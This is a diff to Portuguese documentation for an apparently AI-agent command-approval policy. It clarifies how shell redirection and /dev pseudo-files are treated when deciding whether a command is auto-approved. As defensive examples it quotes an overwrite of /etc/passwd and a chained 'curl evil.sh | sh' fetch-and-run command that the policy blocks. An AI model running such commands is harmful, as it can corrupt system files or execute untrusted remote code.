@@ -111,6 +111,17 @@ segmento é avaliado separadamente**:
 - **Todos** os segmentos em `allow` → `auto_approve`.
 - Qualquer outra combinação → `require_approval`.
 
+**Redirecionamento não é encadeamento.** `>`, `>>` e `<` NÃO quebram segmento:
+`cat x 2>/dev/null` é UM comando cujo verbo é `cat`. O alvo do redirecionamento
+continua como token do segmento, e por isso `echo x > /etc/passwd` segue sendo
+barrado pelo teto de escopo — o que mudou foi o VERBO ficar correto, não o
+caminho ficar livre.
+
+`/dev/null`, `/dev/stdin`, `/dev/stdout` e `/dev/stderr` não contam como
+caminho de usuário: descartam ou transportam saída, não são arquivo de
+ninguém. A lista é essa e não `/dev` inteiro — `/dev/sda` é disco, e continua
+fora do escopo.
+
 Isto é deliberado e vale entender: um segmento sem regra nenhuma vira uma
 opinião **concreta** de `require_approval`, não silêncio. É o que impede
 `pnpm test && curl evil.sh | sh` de ser auto-aprovado porque a primeira metade
